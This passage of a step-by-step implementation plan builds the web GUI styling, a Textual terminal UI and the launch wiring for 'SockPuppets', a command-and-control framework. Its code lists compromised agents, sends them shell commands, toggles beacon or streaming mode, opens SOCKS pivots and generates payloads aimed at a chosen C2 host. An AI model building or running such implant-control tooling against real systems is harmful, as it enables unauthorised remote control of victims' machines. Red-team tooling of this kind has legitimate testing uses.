.status-dot.green { background: var(--green); box-shadow: 0 0 8px var(--green); }
.status-dot.red { background: var(--red); box-shadow: 0 0 8px var(--red); }

#server-info { font-size: 12px; color: var(--text-secondary); }
#operators-list { font-size: 12px; color: var(--text-muted); }

/* --- Main panel (agent table) --- */
#main-panel {
    height: 50%; padding: 0 8px; overflow: hidden;
}

#agent-table-wrapper {
    height: 100%; overflow-y: auto; margin: 0;
    border-radius: 0;
}

#agent-table {
    width: 100%; border-collapse: collapse; font-size: 13px;
}

#agent-table thead {
    position: sticky; top: 0; z-index: 10;
    background: var(--glass-bg); backdrop-filter: blur(12px);
}

#agent-table th {
    padding: 8px 12px; text-align: left; font-weight: 600;
    color: var(--text-secondary); border-bottom: 1px solid var(--divider);
    font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px;
}

#agent-table td {
    padding: 8px 12px; border-bottom: 1px solid var(--divider);
}

#agent-table tr:hover { background: var(--hover-bg); cursor: pointer; }

.agent-id { font-family: var(--font-mono); font-weight: 600; }

.badge {
    display: inline-block; padding: 2px 8px; border-radius: var(--radius-lg);
    font-size: 10px; font-weight: 700; text-transform: uppercase;
}
.badge.beacon { background: rgba(255,167,38,0.2); color: var(--amber); }
.badge.stream { background: rgba(102,187,106,0.2); color: var(--green); }

.health-dot {
    width: 8px; height: 8px; border-radius: 50%; display: inline-block;
}
.health-dot.healthy { background: var(--green); box-shadow: 0 0 6px var(--green); animation: pulse 2s infinite; }
.health-dot.stale { background: var(--amber); box-shadow: 0 0 6px var(--amber); }
.health-dot.dead { background: var(--red); box-shadow: 0 0 6px var(--red); }

@keyframes pulse {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.5; }
}

.empty-state {
    padding: 40px; text-align: center; color: var(--text-muted); font-size: 14px;
}

/* --- Divider --- */
#divider {
    height: 6px; cursor: row-resize; margin: 0 8px;
    background: var(--divider); border-radius: 3px;
    transition: background 0.2s;
}
#divider:hover { background: var(--primary); }

/* --- Bottom panel --- */
#bottom-panel {
    height: 38%; padding: 0 8px 8px; display: flex; flex-direction: column;
}

#tab-bar {
    display: flex; gap: 2px; padding: 4px 4px 0;
}

.tab {
    padding: 6px 14px; border: none; background: transparent;
    color: var(--text-muted); cursor: pointer; font-size: 12px;
    border-radius: var(--radius-sm) var(--radius-sm) 0 0;
    transition: all 0.2s;
}
.tab.active {
    background: var(--glass-bg); backdrop-filter: blur(12px);
    color: var(--text-primary); font-weight: 600;
}
.tab:hover { color: var(--text-primary); }
.tab-close { margin-left: 8px; font-size: 14px; opacity: 0.5; }
.tab-close:hover { opacity: 1; }

#tab-content {
    flex: 1; overflow: hidden;
    background: var(--glass-bg); backdrop-filter: blur(12px);
    border: 1px solid var(--glass-border);
    border-radius: 0 var(--radius-md) var(--radius-md) var(--radius-md);
}

.tab-pane { display: none; height: 100%; overflow-y: auto; padding: 8px; }
.tab-pane.active { display: flex; flex-direction: column; }

/* --- Event log --- */
#event-log { flex: 1; overflow-y: auto; font-family: var(--font-mono); font-size: 12px; }

.event-entry { padding: 2px 0; }
.event-time { color: var(--text-muted); }
.event-type { font-weight: 600; }
.event-agent_registered .event-type { color: var(--green); }
.event-agent_disconnected .event-type { color: var(--red); }
.event-command_sent .event-type { color: var(--primary); }
.event-error .event-type { color: var(--red); }

/* --- Console --- */
.console-pane { display: none; flex-direction: column; }
.console-pane.active { display: flex; }

.console-output {
    flex: 1; overflow-y: auto; padding: 8px;
    font-family: var(--font-mono); font-size: 12px;
    line-height: 1.5;
}

.console-line.command { color: var(--primary); font-weight: 600; }
.console-line.output { color: var(--text-primary); white-space: pre-wrap; }
.console-line.info { color: var(--amber); }
.console-line.error { color: var(--red); }

.console-input-row {
    display: flex; align-items: center; padding: 4px 8px;
    border-top: 1px solid var(--divider);
}
.console-prompt { font-family: var(--font-mono); font-size: 12px; color: var(--amber); white-space: nowrap; margin-right: 8px; }
.console-input {
    flex: 1; border: none; background: transparent; outline: none;
    font-family: var(--font-mono); font-size: 12px; color: var(--text-primary);
}

/* --- Context menu --- */
#context-menu {
    position: fixed; z-index: 100; min-width: 180px;
    padding: 4px 0;
}
#context-menu button {
    display: block; width: 100%; padding: 8px 16px; border: none;
    background: transparent; text-align: left; cursor: pointer;
    color: var(--text-primary); font-size: 13px;
}
#context-menu button:hover { background: var(--hover-bg); }
#context-menu button.danger { color: var(--red); }
#context-menu hr { border: none; border-top: 1px solid var(--divider); margin: 4px 0; }

/* --- Generate modal --- */
.modal-overlay {
    position: fixed; inset: 0; z-index: 200;
    background: rgba(0,0,0,0.3); backdrop-filter: blur(4px);
    display: flex; align-items: center; justify-content: center;
    animation: fadeIn 0.2s ease;
}

.modal {
    width: 520px; max-height: 80vh; overflow-y: auto; padding: 24px;
    animation: scaleIn 0.2s ease;
}

.modal h2 {
    margin-bottom: 16px;
    background: linear-gradient(135deg, var(--primary), var(--primary-dark));
    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
}

.form-row { display: flex; gap: 12px; margin-bottom: 12px; align-items: center; }
.form-row label { font-size: 12px; font-weight: 600; color: var(--text-secondary); min-width: 70px; }
.form-row input, .form-row select {
    flex: 1; padding: 8px 12px; border: 1px solid var(--glass-border);
    border-radius: var(--radius-sm); background: var(--input-bg);
    color: var(--text-primary); font-size: 13px;
}

.evasion-toggles {
    border: 1px solid var(--glass-border); border-radius: var(--radius-sm);
    padding: 12px; margin-bottom: 16px;
}
.evasion-toggles legend { font-size: 12px; font-weight: 600; color: var(--text-secondary); padding: 0 4px; }
.evasion-toggles label { display: inline-flex; align-items: center; gap: 6px; margin: 4px 12px 4px 0; font-size: 13px; cursor: pointer; }

.form-actions { display: flex; gap: 8px; justify-content: flex-end; }

#generate-results { margin-top: 16px; padding-top: 16px; border-top: 1px solid var(--divider); }
.gen-result { padding: 4px 0; font-size: 13px; }
.gen-result a { color: var(--primary); text-decoration: none; }

/* --- Animations --- */
@keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
@keyframes scaleIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }

/* --- Scrollbar --- */
::-webkit-scrollbar { width: 6px; }
::-webkit-scrollbar-track { background: transparent; }
::-webkit-scrollbar-thumb { background: var(--divider); border-radius: 3px; }
::-webkit-scrollbar-thumb:hover { background: var(--text-muted); }
```

- [ ] **Step 4: Manual browser test**

Start the server + GUI:

```python
# Quick test script
from server import SockPuppetsServer
from gui import start_gui

server = SockPuppetsServer()
token = start_gui(server, server.encryption_key, port=13337)
print(f"GUI running on http://localhost:13337")
print(f"Auth token: {token}")
input("Press Enter to stop...")
```

Verify:
- Login overlay appears at `http://localhost:13337`
- Paste token, enter operator name, click Connect
- Dashboard loads with empty agent table
- Dark mode toggle works
- Generate modal opens/closes
- Event log shows "operator_connected"

- [ ] **Step 5: Commit**

```bash
git add gui/static/
git commit -m "feat: add web GUI frontend with Frutiger Aero theme"
```

---

### Task 6: TUI Application

**Files:**
- Create: `tui/__init__.py`, `tui/app.py`, `tui/widgets.py`
- Create: `requirements-tui.txt`

**Interfaces:**
- Consumes: `SockPuppetsServer` (all methods), `EventBus.subscribe()` from Task 1
- Produces: `launch_tui(server: SockPuppetsServer)` function that runs the Textual app

- [ ] **Step 1: Create requirements-tui.txt**

```
textual>=0.40.0
```

- [ ] **Step 2: Implement tui/__init__.py**

```python
"""SockPuppets TUI — optional Textual-based terminal interface."""


def launch_tui(server):
    """Launch the Textual TUI. Blocks until quit."""
    try:
        from tui.app import SockPuppetsTUI
    except ImportError:
        raise ImportError("TUI requires textual: pip install -r requirements-tui.txt")
    app = SockPuppetsTUI(server)
    app.run()
```

- [ ] **Step 3: Implement tui/widgets.py**

```python
"""Custom Textual widgets for SockPuppets TUI."""

from textual.widgets import DataTable, RichLog, Input, Static, Footer, Header, TabbedContent, TabPane
from textual.containers import Vertical, Horizontal
from textual.screen import ModalScreen
from textual.widget import Widget
from rich.text import Text


class AgentTable(DataTable):
    """Live-updating agent table with health indicators."""

    def on_mount(self):
        self.add_columns("ID", "Hostname", "User", "OS", "IP", "Mode", "Health", "Last Seen")
        self.cursor_type = "row"

    def update_agents(self, agents: list, active_ids: set):
        self.clear()
        for agent in agents:
            health = Text("●", style="green") if agent["id"] in active_ids else Text("●", style="red")
            mode = Text("BEACON", style="yellow bold") if agent["mode"] == "beacon" else Text("STREAM", style="green bold")
            self.add_row(
                agent["id"],
                agent.get("hostname", "Unknown"),
                agent.get("username", "Unknown"),
                agent.get("os", "Unknown"),
                agent.get("ip", "Unknown"),
                mode,
                health,
                agent.get("last_seen", ""),
                key=agent["id"],
            )


class ConsolePanel(Vertical):
    """Terminal-style console for agent interaction."""

    def __init__(self, agent_id: str, **kwargs):
        super().__init__(**kwargs)
        self.agent_id = agent_id

    def compose(self):
        yield RichLog(id=f"console-log-{self.agent_id}", wrap=True, markup=True)
        yield Input(placeholder=f"agent[{self.agent_id}]> ", id=f"console-input-{self.agent_id}")

    def append(self, text: str, style: str = ""):
        log = self.query_one(f"#console-log-{self.agent_id}", RichLog)
        if style:
            log.write(Text(text, style=style))
        else:
            log.write(text)


class EventLogPanel(RichLog):
    """Scrolling event log."""

    def add_event(self, event_type: str, message: str):
        from datetime import datetime
        time_str = datetime.now().strftime("%H:%M:%S")
        style_map = {
            "agent_registered": "green",
            "agent_disconnected": "red",
            "command_sent": "cyan",
            "command_queued": "yellow",
            "error": "red bold",
        }
        style = style_map.get(event_type, "white")
        self.write(Text(f"[{time_str}] [{event_type}] {message}", style=style))


class GenerateDialog(ModalScreen):
    """Modal form for payload generation."""

    BINDINGS = [("escape", "dismiss", "Close")]

    def compose(self):
        yield Vertical(
            Static("Generate Payload", classes="dialog-title"),
            Horizontal(
                Static("Host: ", classes="label"),
                Input(placeholder="10.0.0.5", id="gen-host"),
                Static("Port: ", classes="label"),
                Input(placeholder="8443", id="gen-port"),
            ),
            Horizontal(
                Static("Profile: ", classes="label"),
                Input(placeholder="default", id="gen-profile", value="default"),
                Static("Patterns: ", classes="label"),
                Input(placeholder="default", id="gen-patterns", value="default"),
            ),
            Horizontal(
                Static("[Enter] Generate  [Esc] Cancel", classes="hint"),
            ),
            id="generate-dialog",
        )

    def on_input_submitted(self, event):
        if event.input.id == "gen-port":
            host = self.query_one("#gen-host", Input).value
            port = self.query_one("#gen-port", Input).value
            profile = self.query_one("#gen-profile", Input).value
            patterns = self.query_one("#gen-patterns", Input).value
            self.dismiss({"host": host, "port": port, "profile": profile, "patterns": patterns})


class StatusBar(Static):
    """Footer status bar showing server state and keybindings."""

    def update_status(self, server_running: bool, agent_count: int, operators: int = 1):
        status = "[green]●[/green] Running" if server_running else "[red]●[/red] Stopped"
        self.update(f" Server: {status}  |  Agents: {agent_count}  |  Operators: {operators}  |  [dim]F1:Help  F2:Generate  q:Quit[/dim]")
```

- [ ] **Step 4: Implement tui/app.py**

```python
"""Main Textual application for SockPuppets TUI."""

import asyncio
from textual.app import App, ComposeResult
from textual.binding import Binding
from textual.containers import Vertical, Horizontal
from textual.widgets import Header, Footer, TabbedContent, TabPane, Static, Input
from textual.timer import Timer

from tui.widgets import AgentTable, ConsolePanel, EventLogPanel, GenerateDialog, StatusBar


class SockPuppetsTUI(App):
    """SockPuppets Terminal UI — Cobalt Strike layout in the terminal."""

    TITLE = "SockPuppets"
    CSS = """
    #agent-panel { height: 1fr; }
    #bottom-panel { height: 1fr; }
    AgentTable { height: 100%; }
    EventLogPanel { height: 100%; }
    ConsolePanel { height: 100%; }
    #status-bar { dock: bottom; height: 1; background: $surface; }
    .dialog-title { text-align: center; text-style: bold; padding: 1; }
    .label { width: 10; padding: 1; }
    .hint { padding: 1; color: $text-muted; }
    #generate-dialog { width: 60; height: 20; border: solid $primary; background: $surface; padding: 1; }
    """

    BINDINGS = [
        Binding("q", "quit", "Quit", show=True),
        Binding("f1", "help", "Help"),
        Binding("f2", "generate", "Generate"),
        Binding("f5", "refresh", "Refresh"),
        Binding("k", "kill_agent", "Kill"),
        Binding("s", "sleep_agent", "Sleep"),
        Binding("u", "upgrade_agent", "Upgrade"),
        Binding("d", "downgrade_agent", "Downgrade"),
        Binding("p", "socks_agent", "SOCKS"),
    ]

    def __init__(self, server, **kwargs):
        super().__init__(**kwargs)
        self.server = server
        self.event_queue = None
        self.console_tabs = {}

    def compose(self) -> ComposeResult:
        yield Header()
        yield Vertical(
            AgentTable(id="agent-table"),
            id="agent-panel",
        )
        yield TabbedContent(
            TabPane("Event Log", EventLogPanel(id="event-log"), id="tab-event-log"),
            id="bottom-panel",
        )
        yield StatusBar(id="status-bar")
        yield Footer()

    def on_mount(self):
        self.event_queue = self.server.events.subscribe()
        self.set_interval(1.0, self.refresh_agents)
        self.set_interval(0.5, self.poll_events)
        self.refresh_agents()

    def refresh_agents(self):
        table = self.query_one("#agent-table", AgentTable)
        agents = self.server.get_agent_list()
        active_ids = {a["id"] for a in self.server.get_active_agents()}
        table.update_agents(agents, active_ids)

        running = hasattr(self.server, "ws_server") and self.server.ws_server is not None
        self.query_one("#status-bar", StatusBar).update_status(running, len(agents))

    def poll_events(self):
        if not self.event_queue:
            return
        event_log = self.query_one("#event-log", EventLogPanel)
        while not self.event_queue.empty():
            try:
                event = self.event_queue.get_nowait()
                event_log.add_event(event.get("event", "unknown"), str(event))

                if event.get("event") == "agent_result":
                    agent_id = event.get("agent_id")
                    if agent_id in self.console_tabs:
                        self.console_tabs[agent_id].append(event.get("output", ""), "white")
            except Exception:
                break

    def on_data_table_row_selected(self, event):
        agent_id = str(event.row_key.value)
        self.open_console(agent_id)

    def open_console(self, agent_id: str):
        if agent_id not in self.console_tabs:
            panel = ConsolePanel(agent_id, id=f"console-{agent_id}")
            pane = TabPane(f"Console: {agent_id}", panel, id=f"tab-console-{agent_id}")
            self.query_one("#bottom-panel", TabbedContent).add_pane(pane)
            self.console_tabs[agent_id] = panel

        self.query_one("#bottom-panel", TabbedContent).active = f"tab-console-{agent_id}"

    def on_input_submitted(self, event: Input.Submitted):
        input_id = event.input.id or ""
        if input_id.startswith("console-input-"):
            agent_id = input_id.replace("console-input-", "")
            command = event.value.strip()
            if not command:
                return
            event.input.value = ""

            if agent_id in self.console_tabs:
                self.console_tabs[agent_id].append(f"agent[{agent_id}]> {command}", "bold cyan")

            asyncio.ensure_future(self._send_command(agent_id, command))

    async def _send_command(self, agent_id: str, command: str):
        try:
            result = await self.server.send_command_to_agent(agent_id, command)
            if agent_id in self.console_tabs:
                self.console_tabs[agent_id].append(result, "white")
        except Exception as e:
            if agent_id in self.console_tabs:
                self.console_tabs[agent_id].append(f"Error: {e}", "red")

    def _get_selected_agent_id(self) -> str | None:
        table = self.query_one("#agent-table", AgentTable)
        if table.cursor_row is not None:
            try:
                row_key = table.get_row_at(table.cursor_row)
                return str(table.rows[table.cursor_row].key.value) if hasattr(table.rows[table.cursor_row], 'key') else None
            except Exception:
                return None
        return None

    async def action_kill_agent(self):
        agent_id = self._get_selected_agent_id()
        if agent_id:
            result = await self.server.kill_agent(agent_id)
            self.query_one("#event-log", EventLogPanel).add_event("kill", result)
            self.refresh_agents()

    async def action_sleep_agent(self):
        agent_id = self._get_selected_agent_id()
        if agent_id:
            result = await self.server.set_beacon_interval(agent_id, 60)
            self.query_one("#event-log", EventLogPanel).add_event("sleep", result)

    async def action_upgrade_agent(self):
        agent_id = self._get_selected_agent_id()
        if agent_id:
            result = await self.server.upgrade_to_streaming(agent_id)
            self.query_one("#event-log", EventLogPanel).add_event("upgrade", result)
            self.refresh_agents()

    async def action_downgrade_agent(self):
        agent_id = self._get_selected_agent_id()
        if agent_id:
            result = await self.server.downgrade_to_beacon(agent_id, 60)
            self.query_one("#event-log", EventLogPanel).add_event("downgrade", result)
            self.refresh_agents()

    async def action_generate(self):
        result = await self.push_screen_wait(GenerateDialog())
        if result:
            try:
                from agent import AgentGenerator
                gen = AgentGenerator(patterns=result.get("patterns", "default"))
                agents = gen.generate_all(
                    c2_host=result["host"],
                    c2_port=int(result["port"]),
                    profile=result.get("profile", "default"),
                )
                event_log = self.query_one("#event-log", EventLogPanel)
                for agent_type, path in agents.items():
                    event_log.add_event("generate", f"{agent_type}: {path}")
            except Exception as e:
                self.query_one("#event-log", EventLogPanel).add_event("error", str(e))

    def action_refresh(self):
        self.refresh_agents()
```

- [ ] **Step 5: Manual terminal test**

Run:

```bash
pip install textual
cd /Users/ajman/Documents/projects/sockpuppets
python -c "
from server import SockPuppetsServer
from tui import launch_tui
server = SockPuppetsServer()
launch_tui(server)
"
```

Verify:
- TUI renders with agent table (empty) and event log
- Status bar shows server state
- `q` quits with confirmation
- `F2` opens generate dialog
- Key bindings respond

- [ ] **Step 6: Commit**

```bash
git add tui/ requirements-tui.txt
git commit -m "feat: add Textual TUI with agent table, console, and event log"
```

---

### Task 7: main.py Integration + Final Wiring

**Files:**
- Modify: `main.py` — add `--gui`, `--tui` args, `do_gui` command, wire everything together

**Interfaces:**
- Consumes: `gui.start_gui()`, `gui.stop_gui()` from Task 4. `tui.launch_tui()` from Task 6. Redirector CLI commands from Task 3 (already added).

- [ ] **Step 1: Add --gui and --tui flags to main.py main()**

Replace the `main()` function:

```python
def main():
    """Main entry point"""
    import argparse

    parser = argparse.ArgumentParser(description='SockPuppets C2 Framework')
    parser.add_argument('--gui', nargs='?', const=13337, type=int, metavar='PORT',
                        help='Start web GUI on PORT (default: 13337)')
    parser.add_argument('--tui', action='store_true',
                        help='Start Textual TUI instead of CLI')
    args = parser.parse_args()

    if args.tui:
        try:
            from tui import launch_tui
            from server import SockPuppetsServer
            server = SockPuppetsServer()
            launch_tui(server)
        except ImportError:
            print("[-] TUI requires textual: pip install -r requirements-tui.txt")
            sys.exit(1)
        return

    try:
        cli = SockPuppetsCLI()

        if args.gui is not None:
            # Auto-start GUI if --gui flag was passed
            cli._start_gui_on_ready = args.gui

        cli.cmdloop()
    except KeyboardInterrupt:
        print("\n[*] Exiting...")
        sys.exit(0)
```

- [ ] **Step 2: Add do_gui command to SockPuppetsCLI**

Add to `SockPuppetsCLI`:

```python
    def preloop(self):
        """Called before cmdloop starts — handle deferred GUI start."""
        gui_port = getattr(self, '_start_gui_on_ready', None)
        if gui_port:
            self.do_gui(f'start {gui_port}')

    def do_gui(self, arg):
        """Start/stop the web GUI: gui start [port] | gui stop"""
        args = arg.split()
        if not args:
            print("[-] Usage: gui start [port] | gui stop")
            return

        action = args[0].lower()

        if action == 'start':
            port = 13337
            if len(args) > 1:
                try:
                    port = int(args[1])
                except ValueError:
                    print("[-] Invalid port number")
                    return

            if not self.server_running:
                print("[-] Start the C2 server first with 'start'")
                return

            try:
                from gui import start_gui
                token = start_gui(self.server, self.encryption_key.encode() if isinstance(self.encryption_key, str) else self.encryption_key, port)
                print(f"[+] GUI started on http://0.0.0.0:{port}")
                print(f"[+] Auth token: {token}")
                print(f"[*] Share this token with operators to connect")
            except ImportError:
                print("[-] GUI requires fastapi and uvicorn: pip install -r requirements-gui.txt")
            except Exception as e:
                print(f"[-] Failed to start GUI: {e}")

        elif action == 'stop':
            try:
                from gui import stop_gui
                stop_gui()
                print("[+] GUI stopped")
            except Exception as e:
                print(f"[-] Error stopping GUI: {e}")

        else:
            print("[-] Usage: gui start [port] | gui stop")
```

- [ ] **Step 3: Add gui command to help text**

In `do_help`, add a GUI/TUI section:

```python
        print("\033[1mGUI / TUI:\033[0m")
        print("=" * 70)
        print("  \033[1mgui start [port]\033[0m             - Start web GUI (default: 13337)")
        print("  \033[1mgui stop\033[0m                      - Stop web GUI")
        print("  Launch with --gui or --tui flag for alternative interfaces")
        print()
```

- [ ] **Step 4: Integration test**

Run: `cd /Users/ajman/Documents/projects/sockpuppets && python main.py --help`
Expected: Shows `--gui` and `--tui` options

Run: `cd /Users/ajman/Documents/projects/sockpuppets && python -c "from gui import create_app; from tui import launch_tui; print('All imports OK')"`
Expected: Prints "All imports OK" (if deps installed)

- [ ] **Step 5: Run full test suite**

Run: `cd /Users/ajman/Documents/projects/sockpuppets && python -m pytest tests/ -v`
Expected: All tests pass

- [ ] **Step 6: Commit**

```bash
git add main.py
git commit -m "feat: add --gui and --tui CLI flags with mid-session gui start/stop"
```
